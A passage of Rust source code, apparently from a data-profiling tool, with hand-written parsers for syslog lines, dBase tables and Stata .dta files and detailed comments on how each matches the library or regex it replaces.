        let pos = expect_char(line, pos, ' ')?;
        let (msgid, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;

        let (structured_data, pos) = if line[pos..].starts_with('-') {
            (&line[pos..pos + 1], pos + 1)
        } else if line[pos..].starts_with('[') {
            let bracket_len = line[pos..].find(']')?;
            (&line[pos..pos + bracket_len + 1], pos + bracket_len + 1)
        } else {
            return None;
        };

        // ` ?`: an optional single space before the message.
        let pos = if line[pos..].starts_with(' ') {
            pos + 1
        } else {
            pos
        };
        let message = &line[pos..];

        Some(vec![
            pri,
            version,
            timestamp,
            hostname,
            app_name,
            procid,
            msgid,
            structured_data,
            message,
        ])
    }

    /// `(pri, timestamp, hostname, tag, pid, message)` - named here purely
    /// to keep `parse_rfc3164_line`'s signature readable (`clippy::type_complexity`).
    type Rfc3164Fields<'a> = (
        Option<&'a str>,
        &'a str,
        &'a str,
        &'a str,
        Option<&'a str>,
        &'a str,
    );

    /// Hand-rolled replacement for RFC 3164's fixed grammar:
    /// `^(?:<(\d{1,3})>)?([A-Za-z]{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2}) (\S+) ([^:\[]+?)(?:\[(\d+)\])?: ?(.*)$`
    ///
    /// The one genuinely non-trivial piece: `([^:\[]+?)(?:\[(\d+)\])?:`
    /// looks like it needs real backtracking (a non-greedy quantifier plus
    /// an optional group), but doesn't - TAG's own character class already
    /// excludes `:` and `[` outright, so it can never *consume* either one
    /// regardless of greediness. That means TAG's true end is a hard
    /// structural boundary (the first `:` or `[` encountered), not
    /// something a backtracking search has to discover by trial and
    /// error: scan forward once, stop at the first `:` or `[`, and dispatch
    /// on which one it was. Landing on `[` *requires* the bracket+digits
    /// pattern to fully match right there (TAG cannot extend past `[` to
    /// try a different split point if it doesn't) - confirmed by reasoning
    /// through the regex's own backtracking semantics before trusting this
    /// shortcut, not assumed, and cross-checked empirically against the
    /// real `regex` crate's output on real and adversarial syslog lines
    /// (see CLAUDE.md).
    fn parse_rfc3164_line(line: &str) -> Option<Rfc3164Fields<'_>> {
        // `(?:<(\d{1,3})>)?` - if present but malformed, the group matches
        // zero characters (not a partial one), leaving that `<` for the
        // timestamp check right after to reject - so on any failure here,
        // simply don't advance past the attempted position.
        let (pri, pos) = (|| {
            let p1 = expect_char(line, 0, '<')?;
            let (digits, p2) = read_digits_capped(line, p1, 3)?;
            let p3 = expect_char(line, p2, '>')?;
            Some((digits, p3))
        })()
        .map_or((None, 0), |(d, p)| (Some(d), p));

        // `[A-Za-z]{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2}` as one matched span.
        let ts_start = pos;
        let bytes = line.as_bytes();
        if pos + 3 > bytes.len() || !bytes[pos..pos + 3].iter().all(u8::is_ascii_alphabetic) {
            return None;
        }
        let mut p = pos + 3;
        let ws_start = p;
        while p < line.len() && line[p..].chars().next()?.is_whitespace() {
            p += line[p..].chars().next()?.len_utf8();
        }
        if p == ws_start {
            return None;
        }
        // `\d{1,2}` greedy: try 2 digits first (only if immediately
        // followed by the mandatory single whitespace), else fall back to
        // 1 - the same explicit two-alternative check the weblog module's
        // status-code parsing avoids needing, because here a wrong greedy
        // choice *would* leave a valid but different match un-tried.
        let day_bytes = line.as_bytes();
        p = if p + 2 <= day_bytes.len()
            && day_bytes[p].is_ascii_digit()
            && day_bytes[p + 1].is_ascii_digit()
            && line[p + 2..]
                .chars()
                .next()
                .is_some_and(char::is_whitespace)
        {
            p + 2
        } else if p < day_bytes.len()
            && day_bytes[p].is_ascii_digit()
            && line[p + 1..]
                .chars()
                .next()
                .is_some_and(char::is_whitespace)
        {
            p + 1
        } else {
            return None;
        };
        p = expect_char(line, p, ' ').or_else(|| {
            // `\s` (not `\s+`) - any single whitespace char, not just a
            // literal space; `expect_char` only checks one exact char, so
            // fall back to a manual single-whitespace-char check.
            let c = line[p..].chars().next()?;
            c.is_whitespace().then(|| p + c.len_utf8())
        })?;
        let hms = line.as_bytes();
        let hms_ok = p + 8 <= hms.len()
            && hms[p].is_ascii_digit()
            && hms[p + 1].is_ascii_digit()
            && hms[p + 2] == b':'
            && hms[p + 3].is_ascii_digit()
            && hms[p + 4].is_ascii_digit()
            && hms[p + 5] == b':'
            && hms[p + 6].is_ascii_digit()
            && hms[p + 7].is_ascii_digit();
        if !hms_ok {
            return None;
        }
        p += 8;
        let timestamp = &line[ts_start..p];

        let pos = expect_char(line, p, ' ')?;
        let (hostname, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;

        // TAG: scan for the first `:` or `[` - see this function's own doc
        // comment for why this replaces the regex's non-greedy `+?` plus
        // optional-group backtracking exactly, not just approximately.
        let tag_start = pos;
        let mut idx = pos;
        let boundary = loop {
            match line[idx..].chars().next() {
                None => return None,
                Some(':') | Some('[') => break idx,
                Some(c) => idx += c.len_utf8(),
            }
        };
        if boundary == tag_start {
            return None; // TAG requires at least one character (`+?`, not `*?`)
        }
        let tag = &line[tag_start..boundary];

        let (pid, after_tag) = if line[boundary..].starts_with('[') {
            let bp = boundary + 1;
            let (digits, bp2) = read_digits(line, bp)?;
            let bp3 = expect_char(line, bp2, ']')?;
            (Some(digits), bp3)
        } else {
            (None, boundary)
        };
        let pos = expect_char(line, after_tag, ':')?;
        let pos = if line[pos..].starts_with(' ') {
            pos + 1
        } else {
            pos
        };
        let message = &line[pos..];

        Some((pri, timestamp, hostname, tag, pid, message))
    }

    pub(crate) fn columns_from_syslog(
        path: &Path,
        nrows: Option<usize>,
        rfc5424: bool,
    ) -> Result<Vec<ColumnInput>> {
        let content =
            fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;

        let names: Vec<&str> = if rfc5424 {
            vec![
                "facility",
                "severity",
                "version",
                "timestamp",
                "hostname",
                "app_name",
                "procid",
                "msgid",
                "structured_data",
                "message",
            ]
        } else {
            vec![
                "facility",
                "severity",
                "timestamp",
                "hostname",
                "tag",
                "pid",
                "message",
            ]
        };

        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
        let mut total = 0usize;
        for (line_no, line) in content.lines().enumerate() {
            if line.trim().is_empty() {
                continue;
            }
            if nrows.is_some_and(|limit| total >= limit) {
                break;
            }
            let format_name = if rfc5424 { "RFC 5424" } else { "RFC 3164" };

            let values: Vec<Option<String>> = if rfc5424 {
                let caps = parse_rfc5424_line(line).ok_or_else(|| {
                    anyhow!(
                        "line {} doesn't match syslog {format_name}: {line:?}",
                        line_no + 1
                    )
                })?;
                let pri: u32 = caps[0]
                    .parse()
                    .with_context(|| format!("line {}: PRI isn't a number", line_no + 1))?;
                vec![
                    Some(syslog_facility_name(pri)),
                    Some(syslog_severity_name(pri)),
                    Some(caps[1].to_string()),
                    Some(caps[2].to_string()),
                    dash_to_none(caps[3]),
                    dash_to_none(caps[4]),
                    dash_to_none(caps[5]),
                    dash_to_none(caps[6]),
                    dash_to_none(caps[7]),
                    Some(caps[8].to_string()),
                ]
            } else {
                let (pri, timestamp, hostname, tag, pid, message) = parse_rfc3164_line(line)
                    .ok_or_else(|| {
                        anyhow!(
                            "line {} doesn't match syslog {format_name}: {line:?}",
                            line_no + 1
                        )
                    })?;
                let pri: Option<u32> = pri
                    .map(str::parse)
                    .transpose()
                    .with_context(|| format!("line {}: PRI isn't a number", line_no + 1))?;
                vec![
                    pri.map(syslog_facility_name),
                    pri.map(syslog_severity_name),
                    Some(timestamp.to_string()),
                    Some(hostname.to_string()),
                    Some(tag.to_string()),
                    pid.map(str::to_string),
                    Some(message.to_string()),
                ]
            };
            for (col_idx, value) in values.into_iter().enumerate() {
                raw[col_idx].push(value);
            }
            total += 1;
        }

        let mut columns = Vec::new();
        for (col_idx, name) in names.into_iter().enumerate() {
            let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
            let current_type = if non_null.is_empty() {
                "String".to_string()
            } else {
                let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                naive_current_type(&refs).to_string()
            };
            columns.push(ColumnInput {
                name: name.to_string(),
                current_type,
                raw_values: non_null,
                total,
                skip_heuristics: false,
            });
        }
        Ok(columns)
    }
} // mod syslog_support

#[cfg(feature = "syslog")]
fn columns_from_syslog(
    path: &Path,
    nrows: Option<usize>,
    rfc5424: bool,
) -> Result<Vec<ColumnInput>> {
    syslog_support::columns_from_syslog(path, nrows, rfc5424)
}

#[cfg(not(feature = "syslog"))]
fn columns_from_syslog(
    _path: &Path,
    _nrows: Option<usize>,
    _rfc5424: bool,
) -> Result<Vec<ColumnInput>> {
    bail!(
        "syslog support isn't compiled in - rebuild with `cargo build --release --features syslog` (or --features full)"
    )
}

// --- dBase reader (opt-in via --features dbase) ---
// A soft-deleted record (dBase's own "marked for deletion" flag) is skipped
// by this reader before any of this project's own heuristics ever see it -
// the same convention dBase and every tool built on it already treats as
// "logically absent", not something this tool is choosing to hide. Column
// order comes from the file's own field descriptor table (in file order)
// rather than a HashMap's iteration order, which isn't guaranteed stable.
// The reader itself (`dbase_support`) is hand-rolled - see CLAUDE.md's
// Dependency footprint section for why and how it was verified.

#[cfg(feature = "dbase")]
mod dbase_support {
    use super::*;
    use std::collections::HashMap;
    use std::fs::File;
    use std::io::{BufReader, Read, Seek, SeekFrom};

    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum FieldType {
        Character,
        Date,
        Float,
        Numeric,
        Logical,
        Currency,
        DateTime,
        Integer,
        Double,
        Memo,
    }

    impl FieldType {
        /// Verified directly against the `dbase` crate's own
        /// `FieldType::from(char)` (`field/types.rs`) rather than assumed -
        /// any byte outside this set is a hard, open-time error there too
        /// (`ErrorKind::InvalidFieldType`), not a guess.
        fn from_byte(b: u8) -> Result<Self> {
            Ok(match b {
                b'C' => Self::Character,
                b'D' => Self::Date,
                b'F' => Self::Float,
                b'N' => Self::Numeric,
                b'L' => Self::Logical,
                b'Y' => Self::Currency,
                b'T' => Self::DateTime,
                b'I' => Self::Integer,
                b'B' => Self::Double,
                b'M' => Self::Memo,
                other => bail!(
                    "unrecognized dBase field type byte {:?} ({other:#04x})",
                    other as char
                ),
            })
        }
    }

    fn field_type_label(t: FieldType) -> &'static str {
        match t {
            FieldType::Character | FieldType::Memo => "String",
            FieldType::Numeric | FieldType::Float | FieldType::Double | FieldType::Currency => {
                "f64"
            }
            FieldType::Integer => "i64",
            FieldType::Logical => "bool",
            FieldType::Date => "Date",
            FieldType::DateTime => "Timestamp",
        }
    }

    struct FieldInfo {
        name: String,
        field_type: FieldType,
        field_length: u8,
    }

    #[derive(Debug, Clone)]
    enum Value {
        Character(Option<String>),
        Numeric(Option<f64>),
        Logical(Option<bool>),
        /// (year, month, day)
        Date(Option<(u32, u32, u32)>),
        Float(Option<f32>),
        Integer(i32),
        Currency(f64),
        /// (year, month, day), (hour, minute, second)
        DateTime((u32, u32, u32), (u32, u32, u32)),
        Double(f64),
    }

    fn value_to_string(v: &Value) -> Option<String> {
        match v {
            Value::Character(s) => s.clone(),
            Value::Numeric(n) => n.map(|x| x.to_string()),
            Value::Logical(b) => b.map(|x| x.to_string()),
            Value::Date(d) => d.map(|(y, m, d)| format!("{y:04}{m:02}{d:02}")),
            Value::Float(f) => f.map(|x| x.to_string()),
            Value::Integer(i) => Some(i.to_string()),
            Value::Currency(c) => Some(c.to_string()),
            Value::DateTime((y, m, d), (h, mi, s)) => {
                Some(format!("{y:04}{m:02}{d:02} {h:02}:{mi:02}:{s:02}"))
            }
            Value::Double(d) => Some(d.to_string()),
        }
    }

    /// Validates a dBase date exactly the way the `dbase` crate's own
    /// `Date::new` does - used both for the header's own last-update date
    /// (which the crate validates at *open* time, so a file with an out-
    /// of-range last-update month/day fails to open at all - the same
    /// constraint this project's own `sniff_format` dBase content-sniffing
    /// check already independently relies on) and for every per-field
    /// `FieldType::Date`/`DateTime` value.
    fn validate_date(year: u32, month: u32, day: u32) -> Result<()> {
        if year > 9999 {
            bail!("dBase date year {year} is out of range (must be <= 9999)");
        }
        if !(1..=12).contains(&month) {
            bail!("dBase date month {month} is out of range (must be 1..=12)");
        }
        if !(1..=31).contains(&day) {
            bail!("dBase date day {day} is out of range (must be 1..=31)");
        }
        Ok(())
    }

    #[derive(Clone, Copy)]
    enum TextMode {
        StrictUtf8,
        LossyUtf8,
    }

    /// Whether a dBase file's text fields decode strictly as UTF-8
    /// (`CodePageMark::Utf8`, byte `0xf0`) or leniently, replacing invalid
    /// bytes (`CodePageMark::Undefined`/`Invalid` - byte `0x00` or any
    /// value this project doesn't otherwise recognize). Any of the ~20
    /// *named* legacy single-byte codepages (CP437, CP1252, CP932, ...) -
    /// verified directly against the `dbase` crate's own
    /// `CodePageMark::from(u8)` table, not guessed - is a disclosed, clear
    /// error rather than silently misdecoding: correctly decoding those
    /// needs a real per-codepage byte-to-codepoint table, which neither
    /// this project nor the `dbase` crate's own *default* build (no
    /// `yore`/`encoding_rs` feature enabled, exactly matching this
    /// project's own prior `Cargo.toml` entry for it) actually carries -
    /// a real, pre-existing limitation of the crate this hand-roll
    /// replaces, confirmed rather than assumed: `CodePageMark::to_encoding`
    /// returns `None` for every one of these bytes without those two
    /// optional crate features, at which point `open_dbase` itself already
    /// hard-errors with `UnsupportedCodePage` before a single record is
    /// ever read.
    fn resolve_text_mode(code_page_mark: u8) -> Result<TextMode> {
        match code_page_mark {
            0xf0 => Ok(TextMode::StrictUtf8),
            0x00 => Ok(TextMode::LossyUtf8),
            0x01 | 0x02 | 0x03 | 0x08 | 0x09 | 0x0A | 0x0B | 0x0D | 0x0E | 0x0F | 0x10 | 0x11
            | 0x12 | 0x13 | 0x4D | 0x64 | 0x65 | 0x66 | 0x67 | 0x68 | 0x69 | 0x6A | 0x6B | 0x78
            | 0x79 | 0x7A | 0x7B | 0x7C | 0x7D | 0x7E | 0xC8 | 0xC9 | 0xCA | 0xCB => {
                bail!(
                    "dBase code page marker {code_page_mark:#04x} isn't supported - this reader (like the `dbase` crate's own default build) only reads UTF-8 or undefined/unmarked-codepage dBase files"
                )
            }
            _ => Ok(TextMode::LossyUtf8),
        }
    }

    fn decode_text(mode: TextMode, bytes: &[u8]) -> Result<String> {
        match mode {
            TextMode::StrictUtf8 => std::str::from_utf8(bytes)
                .map(str::to_string)
                .context("dBase field content is not valid UTF-8"),
            TextMode::LossyUtf8 => Ok(String::from_utf8_lossy(bytes).into_owned()),
        }
    }

    /// Trims leading/trailing space (`0x20`) bytes, exactly matching the
    /// `dbase` crate's own `trim_field_data` - including its one real
    /// quirk, verified directly against its source rather than assumed:
    /// the scan for the first/last non-space byte stops dead at the
    /// *first* NUL byte encountered anywhere in the field (not just a
    /// trailing one), so content after an embedded NUL is silently
    /// excluded. This project's own reader only ever needs the crate's
    /// default `TrimOption::BeginEnd` behavior (this project's code never
    /// overrides `ReadingOptions::character_trim`), so that's the only
    /// variant implemented.
    fn trim_both(bytes: &[u8]) -> &[u8] {
        let mut first: Option<usize> = None;
        let mut last = 0usize;
        for (i, &b) in bytes.iter().enumerate() {
            if b == 0 {
                break;
            }
            if b != b' ' {
                if first.is_none() {
                    first = Some(i);
                }
                last = i;
            }
        }
        match first {
            Some(first) => &bytes[first..=last],
            None => &[],
        }
    }

    fn parse_ascii_digits(bytes: &[u8]) -> u32 {
        bytes
            .iter()
            .fold(0u32, |acc, &b| acc * 10 + u32::from(b - b'0'))
    }

    /// Decomposes a FoxBase/VFP `DateTime`'s time-of-day word (milliseconds
    /// since midnight, stored as a signed `i32`) into hours/minutes/seconds,
    /// with the exact same (lenient) range check the `dbase` crate's own
    /// `Time::new` applies - `<= 24`/`<= 60`/`<= 60`, not the stricter
    /// `< 24`/`< 60`/`< 60` a real time-of-day would need, since this is
    /// what the crate being replaced actually does (verified against its
    /// source, not tightened here for the sake of "correctness" the
    /// original never had either).
    fn time_from_word(time_word: i32) -> Result<(u32, u32, u32)> {
        let hours_i = time_word / 3_600_000;
        let rem = time_word - hours_i * 3_600_000;
        let minutes_i = rem / 60_000;
        let rem = rem - minutes_i * 60_000;
        let seconds_i = rem / 1_000;
        let (hours, minutes, seconds) = (hours_i as u32, minutes_i as u32, seconds_i as u32);
        if hours > 24 {
            bail!("dBase DateTime hour {hours} is out of range");
        }
        if minutes > 60 {
            bail!("dBase DateTime minute {minutes} is out of range");
        }
        if seconds > 60 {
            bail!("dBase DateTime second {seconds} is out of range");
        }
        Ok((hours, minutes, seconds))
    }

    struct Header {
        num_records: u32,
        offset_to_first_record: u16,
        is_visual_foxpro: bool,
        code_page_mark: u8,
    }

    /// Reads the fixed 32-byte dBase header. Verified byte-for-byte
    /// against the `dbase` crate's own `Header::read_from` (`header.rs`):
    /// version (1 byte), last-update date (3 bytes: year-since-1900/month/
    /// day - validated here as `Header::read_from` itself does, so an
    /// out-of-range month/day fails to open the file at all), record count
    /// (`u32` LE), offset to first record / header length (`u16` LE),
    /// record size (`u16` LE, read but - like the crate itself - never
    /// trusted; the real record size used below is recomputed from the
    /// field table), 4 reserved/flag bytes, 12 reserved bytes, table flags
    /// (1 byte), code page mark (1 byte), 2 reserved bytes.
    fn read_header<R: Read>(r: &mut R) -> Result<Header> {
        let mut buf = [0u8; 32];
        r.read_exact(&mut buf)
            .context("failed reading dBase header")?;
        let version = buf[0];
        let year = 1900 + u32::from(buf[1]);
        let month = u32::from(buf[2]);
        let day = u32::from(buf[3]);
        validate_date(year, month, day).context("dBase header's last-update date is invalid")?;
        let num_records = u32::from_le_bytes([buf[4], buf[5], buf[6], buf[7]]);
        let offset_to_first_record = u16::from_le_bytes([buf[8], buf[9]]);
        let code_page_mark = buf[29];
        let is_visual_foxpro = matches!(version, 0x30..=0x32);
        Ok(Header {
            num_records,
            offset_to_first_record,
            is_visual_foxpro,
            code_page_mark,
        })
    }

    /// Reads one fixed 32-byte field descriptor: name (11 bytes, NUL-
    /// padded/terminated), type (1 byte, ASCII), 4 bytes unused by reading
    /// (displacement field), length (1 byte), 15 bytes unused by reading
    /// (decimal places, flags, autoincrement state, reserved). Verified
    /// against `FieldInfo::read_from`/`FieldInfo::SIZE` in the `dbase`
    /// crate's `field/mod.rs`.
    fn read_field_info<R: Read>(r: &mut R, text_mode: TextMode) -> Result<FieldInfo> {
        let mut buf = [0u8; 32];
        r.read_exact(&mut buf)
            .context("failed reading a dBase field descriptor")?;
        let name_bytes = buf[0..11].split(|&b| b == 0).next().unwrap_or(&[]);
        let name = decode_text(text_mode, name_bytes)?;
        let field_type = FieldType::from_byte(buf[11])?;
        let field_length = buf[16];
        Ok(FieldInfo {
            name,
            field_type,
            field_length,
        })
    }

    fn read_field_value(f: &FieldInfo, bytes: &[u8], text_mode: TextMode) -> Result<Value> {
        Ok(match f.field_type {
            FieldType::Logical => {
                let c = bytes.first().copied().unwrap_or(b' ');
                match c {
                    b' ' | b'?' => Value::Logical(None),
                    b'1' | b'T' | b't' | b'Y' | b'y' => Value::Logical(Some(true)),
                    b'0' | b'F' | b'f' | b'N' | b'n' => Value::Logical(Some(false)),
                    _ => Value::Logical(None),
                }
            }
            FieldType::Character => {
                let trimmed = trim_both(bytes);
                if trimmed.is_empty() {
                    Value::Character(None)
                } else {
                    Value::Character(Some(decode_text(text_mode, trimmed)?))
                }
            }
            FieldType::Numeric => {
                let trimmed = trim_both(bytes);
                if trimmed.is_empty() || trimmed.iter().all(|&c| c == b'*') {
                    Value::Numeric(None)
                } else {
                    let s = decode_text(text_mode, trimmed)?;
                    Value::Numeric(Some(s.trim().parse::<f64>().with_context(|| {
                        format!("dBase Numeric field {s:?} isn't a valid number")
                    })?))
                }
            }
            FieldType::Float => {
                let trimmed = trim_both(bytes);
                if trimmed.is_empty() || trimmed.iter().all(|&c| c == b'*') {
                    Value::Float(None)
                } else {
                    let s = decode_text(text_mode, trimmed)?;
                    Value::Float(Some(s.trim().parse::<f32>().with_context(|| {
                        format!("dBase Float field {s:?} isn't a valid number")
                    })?))
                }
            }
            FieldType::Date => {
                let trimmed = trim_both(bytes);
                if trimmed.len() < 8 {
                    Value::Date(None)
                } else {
                    let d = &trimmed[..8];
                    if !d.iter().all(u8::is_ascii_digit) {
                        bail!(
                            "dBase Date field isn't 8 ASCII digits: {:?}",
                            String::from_utf8_lossy(d)
                        );
                    }
                    let year = parse_ascii_digits(&d[0..4]);
                    let month = parse_ascii_digits(&d[4..6]);
                    let day = parse_ascii_digits(&d[6..8]);
                    validate_date(year, month, day)?;
                    Value::Date(Some((year, month, day)))
                }
            }
            FieldType::Integer => {
                if bytes.len() < 4 {
                    bail!("dBase Integer field is too short");
                }
                Value::Integer(i32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
            }
            FieldType::Double => {
                if bytes.len() < 8 {
                    bail!("dBase Double field is too short");
                }
                Value::Double(f64::from_le_bytes(bytes[..8].try_into().unwrap()))
            }
            FieldType::Currency => {
                if bytes.len() < 8 {
                    bail!("dBase Currency field is too short");
                }
                Value::Currency(f64::from_le_bytes(bytes[..8].try_into().unwrap()))
            }
            FieldType::DateTime => {
                if bytes.len() < 8 {
                    bail!("dBase DateTime field is too short");
                }
                let jdn = i32::from_le_bytes(bytes[0..4].try_into().unwrap());
                let time_word = i32::from_le_bytes(bytes[4..8].try_into().unwrap());
                // The dBase/VFP `DateTime` on-disk representation stores a
                // Julian Day Number - a different epoch and algorithm from
                // this project's own `civil_from_days` (days since the
                // 1970-01-01 Unix epoch), but the two are
                // related by one fixed, well-known constant: JDN 2440588 is
                // 1970-01-01 itself (the same constant the `dbase` crate's
                // own `Date::to_unix_days` uses: `julian_day - 2440588`).
                // Subtracting it once lets this reuse the project's
                // already-verified civil-calendar conversion directly
                // rather than re-deriving the crate's own separate
                // Julian-day arithmetic from scratch.
                let unix_days = i64::from(jdn) - 2_440_588;
                let (y, m, d) = civil_from_days(unix_days);
                let (h, mi, s) = time_from_word(time_word)?;
                validate_date(u32::try_from(y).unwrap_or(u32::MAX), m, d)?;
                Value::DateTime((y as u32, m, d), (h, mi, s))
            }
            FieldType::Memo => unreachable!("memo fields are rejected before any record is read"),
        })
    }

    pub(crate) fn columns_from_dbase(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut r = BufReader::new(file);

        let header = read_header(&mut r).with_context(|| format!("failed reading {path:?}"))?;
        let text_mode = resolve_text_mode(header.code_page_mark)?;

        // Visual FoxPro stores a 263-byte "backlink" (the path to the
        // database container) right before the field descriptor table -
        // verified against `open_dbase`'s own `BACKLINK_SIZE` handling.
        const BACKLINK_SIZE: u16 = 263;
        let adjusted_offset = if header.is_visual_foxpro {
            header
                .offset_to_first_record
                .checked_sub(BACKLINK_SIZE)
                .ok_or_else(|| anyhow!("dBase file is invalid (BACKLINK_SIZE too big)"))?
        } else {
            header.offset_to_first_record
        };

        let num_fields = usize::from(adjusted_offset)
            .checked_sub(32 + 1)
            .map(|v| v / 32)
            .ok_or_else(|| {
                anyhow!("dBase file's offset to first record is before the end of its header")
            })?;

        let mut fields = Vec::with_capacity(num_fields);
        for _ in 0..num_fields {
            fields.push(read_field_info(&mut r, text_mode)?);
        }
        if fields.iter().any(|f| f.field_type == FieldType::Memo) {
            bail!("dBase memo fields (external .dbt/.fpt files) aren't supported by this reader");
        }

        // The field-table terminator byte is read but - matching the
        // `dbase` crate's own explicit choice - never checked against its
        // conventional value (0x0D). The explicit seek right after is what
        // actually establishes the first record's position, the same
        // defensive choice `open_dbase` makes rather than trusting the
        // stream position to already be correct.
        let mut terminator = [0u8; 1];
        r.read_exact(&mut terminator)
            .context("failed reading dBase field-table terminator")?;
        r.seek(SeekFrom::Start(u64::from(header.offset_to_first_record)))
            .context("failed seeking to the first dBase record")?;

        // The record's actual on-disk size is recomputed from the field
        // table's own lengths, not trusted from the header's own
        // (sometimes inconsistent) declared record size - matching
        // `open_dbase`'s own `record_size` recomputation exactly.
        let record_data_len: usize = fields.iter().map(|f| f.field_length as usize).sum();

        let mut records: Vec<HashMap<String, Value>> = Vec::new();
        let mut deletion_flag = [0u8; 1];
        let mut record_buf = vec![0u8; record_data_len];
        for _ in 0..header.num_records {
            r.read_exact(&mut deletion_flag)
                .context("failed reading a dBase record's deletion flag")?;
            if deletion_flag[0] == 0x2A {
                r.seek(SeekFrom::Current(record_data_len as i64))
                    .context("failed skipping a deleted dBase record")?;
                continue;
            }
            r.read_exact(&mut record_buf)
                .context("failed reading a dBase record")?;

            let mut map = HashMap::with_capacity(fields.len());
            let mut pos = 0usize;
            for f in &fields {
                let field_bytes = &record_buf[pos..pos + f.field_length as usize];
                pos += f.field_length as usize;
                let value = read_field_value(f, field_bytes, text_mode)?;
                map.insert(f.name.clone(), value);
            }
            records.push(map);
        }
        if let Some(n) = nrows {
            records.truncate(n);
        }
        let total = records.len();

        let mut columns = Vec::new();
        for f in &fields {
            let raw_values: Vec<String> = records
                .iter()
                .filter_map(|r| r.get(&f.name).and_then(value_to_string))
                .collect();
            columns.push(profile_column(
                ColumnInput {
                    name: f.name.clone(),
                    current_type: field_type_label(f.field_type).to_string(),
                    raw_values,
                    total,
                    skip_heuristics: false,
                },
                n_samples,
            ));
        }
        Ok(columns)
    }
} // mod dbase_support

#[cfg(feature = "dbase")]
fn columns_from_dbase(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    dbase_support::columns_from_dbase(path, nrows, n_samples)
}

#[cfg(not(feature = "dbase"))]
fn columns_from_dbase(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "dBase support isn't compiled in - rebuild with `cargo build --release --features dbase` (or --features full)"
    )
}

// --- Stata .dta reader (opt-in via --features stata) ---
// Stata's own missing-value marker (`.` through `.z`) is a real, explicit
// per-value flag in the file format, not something this tool infers - a
// Missing value is simply omitted from raw_values, the same way every
// other reader here treats an absent/blank value. A `strL` long-string
// reference needs a second read pass over a separate file section to
// resolve (not just the row bytes already in hand), which this tool
// doesn't do - it's represented as a visible placeholder rather than
// silently dropped or guessed at. Variable/value labels (Stata's own
// human-authored variable descriptions and coded-value names, e.g.
// 1/2/3 meaning "male"/"female"/"other") aren't surfaced - see CLAUDE.md's
// Known limitations. The reader itself (`stata_support`) is hand-rolled -
// see CLAUDE.md's Dependency footprint section for why and how it was
// verified.

#[cfg(feature = "stata")]
mod stata_support {
    use super::*;
    use std::fs::File;
    use std::io::{BufReader, Read, Seek, SeekFrom};

    /// A defensive cap on the declared variable count, checked before any
    /// buffer sized from it is allocated - not a real-world limitation
    /// (Stata itself has never supported anywhere near this many
    /// variables), but a guard against a corrupted/adversarial header
    /// claiming an enormous count and forcing a huge upfront allocation
    /// before a single byte of real schema data has been read, the same
    /// class of guard `msgpack_support`/`cbor_support` already needed for
    /// their own untrusted length fields.
    const MAX_VARIABLES: u32 = 1_000_000;

    /// Same reasoning, for the summed per-row byte width: even with
    /// `MAX_VARIABLES` in place, that many maximum-width (2045-byte)
    /// string variables could still describe a multi-gigabyte single row.
    /// No real Stata dataset needs anywhying close to 100 MB per
    /// observation.
    const MAX_ROW_LEN: usize = 100_000_000;

    /// A DTA format version (102-119, the `dbase` crate's ReadStat-derived
    /// documented range), stored as its raw byte rather than a 18-variant
    /// enum - every version-dependent field width below is a simple
    /// comparison against this number, verified field-by-field against
    /// the `dta` crate's own `release.rs` rather than assumed.
    #[derive(Clone, Copy, PartialEq, PartialOrd)]
    struct Release(u8);

    impl Release {
        fn is_xml_like(self) -> bool {
            self.0 >= 117
        }
        /// Format 113+ reserves a range of each numeric type's encoding
        /// for 27 distinct missing values (`.`, `.a`-`.z`); earlier
        /// formats have only one system-missing sentinel per type.
        fn supports_tagged_missing(self) -> bool {
            self.0 >= 113
        }
        /// V104/V105's double missing value is the exact bit pattern
        /// `0x54C0_0000_0000_0000` (2^333) - a value that falls *inside*
        /// the normal valid `f64` range, so it must be matched exactly
        /// rather than via a range check the way every other era's
        /// sentinel can be.
        fn uses_magic_double_missing(self) -> bool {
            self.0 <= 105
        }
        fn default_encoding_is_utf8(self) -> bool {
            self.0 >= 118
        }
        fn dataset_label_len(self) -> usize {
            if self.0 < 108 { 32 } else { 81 }
        }
        /// `None` for V102-104 (no timestamp field at all in the binary
        /// header).
        fn timestamp_len(self) -> Option<usize> {
            if self.0 < 105 { None } else { Some(18) }
        }
        /// XML-only: the observation count is a `u32` for format 117,
        /// `u64` for 118+.
        fn supports_extended_observation_count(self) -> bool {
            self.0 >= 118
        }
        /// XML-only: the variable count is a `u16` for 117-118, `u32`
        /// for 119.
        fn supports_extended_variable_count(self) -> bool {
            self.0 >= 119
        }
        /// Binary-only: the observation count is a `u16` for V102 only;
        /// V103-116 use `u32` (the binary container tops out at V116,
        /// so this never needs to consider 118's `u64`).
        fn supports_extended_binary_observation_count(self) -> bool {
            self.0 >= 103
        }
        /// Each type-list entry is 1 byte pre-117 (ASCII-ish codes or
        /// 0xFB-0xFF), 2 bytes at 117+ (needed for strL and wider codes).
        fn type_list_entry_len(self) -> usize {
            if self.0 >= 117 { 2 } else { 1 }
        }
        fn variable_name_len(self) -> usize {
            if self.0 >= 118 {
                129
            } else if self.0 >= 110 {
                33
            } else {
                9
            }
        }
        fn format_entry_len(self) -> usize {
            if self.0 >= 118 {
                57
            } else if self.0 >= 114 {
                49
            } else if self.0 >= 105 {
                12
            } else {
                7
            }
        }
        fn variable_label_len(self) -> usize {
            if self.0 >= 118 {
                321
            } else if self.0 >= 108 {
                81
            } else {
                32
            }
        }
        fn sort_entry_len(self) -> usize {
            if self.0 >= 119 { 4 } else { 2 }
        }
        /// XML-only: the `<label>` length prefix is a `u8` for 117,
        /// `u16` for 118+.
        fn supports_extended_dataset_label(self) -> bool {
